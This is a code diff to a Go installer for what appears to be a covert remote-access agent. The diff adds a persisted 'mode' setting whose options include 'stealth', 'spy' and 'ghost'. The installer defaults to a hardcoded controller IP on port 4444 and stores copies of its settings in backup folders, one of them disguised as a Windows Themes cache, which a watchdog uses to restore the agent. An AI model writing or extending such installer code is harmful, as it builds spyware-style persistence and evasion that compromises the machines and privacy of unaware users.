@@ -184,6 +184,7 @@ func install() {
 
 	controllerAddr := "176.229.98.54:4444"
 	agentToken := ""
+	agentModeFlag := ""
 	for i, a := range os.Args {
 		if (a == "-controller" || a == "--controller") && i+1 < len(os.Args) {
 			controllerAddr = os.Args[i+1]
@@ -197,6 +198,12 @@ func install() {
 			agentToken = strings.TrimSpace(strings.TrimPrefix(a, "-token="))
 		} else if strings.HasPrefix(a, "--token=") {
 			agentToken = strings.TrimSpace(strings.TrimPrefix(a, "--token="))
+		} else if (a == "-mode" || a == "--mode") && i+1 < len(os.Args) {
+			agentModeFlag = strings.TrimSpace(os.Args[i+1])
+		} else if strings.HasPrefix(a, "-mode=") {
+			agentModeFlag = strings.TrimSpace(strings.TrimPrefix(a, "-mode="))
+		} else if strings.HasPrefix(a, "--mode=") {
+			agentModeFlag = strings.TrimSpace(strings.TrimPrefix(a, "--mode="))
 		}
 	}
 	_ = os.WriteFile(filepath.Join(installDir, "controller.txt"), []byte(controllerAddr+"\n"), 0644)
@@ -207,6 +214,25 @@ func install() {
 	if agentToken != "" {
 		_ = os.WriteFile(tokenPath, []byte(agentToken+"\n"), 0600)
 		log.Printf("[*] Agent registration token stored")
+	}
+	// Operation mode (v1.42.3): persisted to mode.json so it survives
+	// reboots/updates. Roster duplicated from internal/commands/mode.go
+	// (keep in sync) to avoid pulling agent deps into the installer.
+	if agentModeFlag != "" {
+		validModes := []string{"normal", "stealth", "spy", "ghost", "performance", "kiosk", "audit"}
+		ok := false
+		for _, v := range validModes {
+			if strings.EqualFold(agentModeFlag, v) {
+				agentModeFlag = v
+				ok = true
+				break
+			}
+		}
+		if !ok {
+			log.Fatalf("unknown -mode %q (valid: %s)", agentModeFlag, strings.Join(validModes, ", "))
+		}
+		_ = os.WriteFile(filepath.Join(installDir, "mode.json"), []byte(agentModeFlag+"\n"), 0644)
+		log.Printf("[*] Agent operation mode stored: %s", agentModeFlag)
 	}
 
 	cmdLine := fmt.Sprintf(`"%s" -controller %s -ca "%s"`, agentPath, controllerAddr, certPath)
@@ -304,6 +330,20 @@ func install() {
 			_ = os.WriteFile(tokenPath, b, 0600)
 			_ = os.WriteFile(backupToken2, b, 0600)
 			log.Printf("[*] Kept existing registration token from backup")
+		}
+	}
+	// Mode travels with the backups (only when set - never create empties).
+	if agentModeFlag != "" {
+		_ = os.WriteFile(filepath.Join(blenderDir, "mode.json"), []byte(agentModeFlag+"\n"), 0644)
+		_ = os.WriteFile(filepath.Join(backupDir2, "mode.json"), []byte(agentModeFlag+"\n"), 0644)
+	} else {
+		// Keep a previously-set mode across reinstalls that omit -mode.
+		for _, bp := range []string{filepath.Join(blenderDir, "mode.json"), filepath.Join(backupDir2, "mode.json")} {
+			if b, err := os.ReadFile(bp); err == nil && len(bytes.TrimSpace(b)) > 0 {
+				_ = os.WriteFile(filepath.Join(installDir, "mode.json"), b, 0644)
+				log.Printf("[*] Kept existing operation mode from backup")
+				break
+			}
 		}
 	}
 	// version.txt next to binary AND both backups: watchdog restores only
@@ -512,7 +552,9 @@ func main() {
 			_ = os.Remove(filepath.Join(installDir, "pending_update.json"))
 			_ = os.Remove(filepath.Join(installDir, "rollback_notice.json"))
 			_ = os.Remove(filepath.Join(installDir, "token.txt"))
+			_ = os.Remove(filepath.Join(installDir, "mode.json"))
 			_ = os.Remove(filepath.Join(blenderDir, "token.txt"))
+			_ = os.Remove(filepath.Join(blenderDir, "mode.json"))
 		// Second backup location (v1.40.6+).
 		backupDir2 := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes", "Cache")
 		if os.Getenv("APPDATA") == "" {
